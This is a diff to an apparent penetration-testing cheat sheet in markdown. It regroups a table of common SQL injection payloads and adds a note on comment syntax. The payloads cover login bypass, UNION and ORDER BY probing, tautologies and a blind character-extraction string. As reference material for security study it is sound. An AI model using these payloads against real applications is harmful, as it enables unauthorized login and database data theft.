@@ -246,21 +246,23 @@ _$~ rsync [options] rsync://IP_or_Hostname/module/_
 | CREATE      | Create a new table or database                    | CREATE TABLE users (...);          |
 | DROP        | Delete a table or database                        | DROP TABLE users;                  |
 
-### Common SQL Injection Payloads
+### Common SQL Injection Payloads 
+- Can replace "--" with "#")
+   - "--" must have a space after in order for syntax to be correct
 
 | Payload                         | Purpose                                      | Description                        |
 |:--------------------------------|:---------------------------------------------|:-----------------------------------|
 | ' OR 1=1 --                    | Bypass login                                | Always true, skips password check |
-| admin' --                      | Login as admin without password              | Comments out the rest             |
-| ' UNION SELECT null,null --   | Test for UNION-based injection               | Combines multiple SELECTs         |
-| ' AND 1=2 --                   | False condition for testing filtering        | Useful for confirming injection   |
-| ' ORDER BY 1 --                | Check number of columns                      | Used to trigger errors            |
-| ' OR 'a'='a' --                | Classic tautology                            | Always true                       |
 | ' OR 1=1 #                         | Bypass login                                | Always true, comments out rest       |
+| admin' --                      | Login as admin without password              | Comments out the rest             |
 | admin' #                           | Login as admin without password              | Comments out password clause         |
+| ' UNION SELECT null,null --   | Test for UNION-based injection               | Combines multiple SELECTs         |
 | ' UNION SELECT null,null #        | Test for UNION-based injection               | Checks for compatible column count   |
+| ' AND 1=2 --                   | False condition for testing filtering        | Useful for confirming injection   |
 | ' AND 1=2 #                        | False condition for testing filtering        | Used to trigger no results           |
+| ' ORDER BY 1 --                | Check number of columns                      | Used to trigger errors            |
 | ' ORDER BY 1 #                     | Check number of columns                      | Triggers error if column doesn't exist |
+| ' OR 'a'='a' --                | Classic tautology                            | Always true                       |
 | ' OR 'a'='a' #                     | Classic tautology                            | Always true                          |
 | ' OR 1=1 LIMIT 1 #                | Selects only one result                      | Avoids long output                   |
 | ' AND ASCII(SUBSTRING(user(),1,1))=114 # | Blind SQLi payload                      | Extracts info character by character |
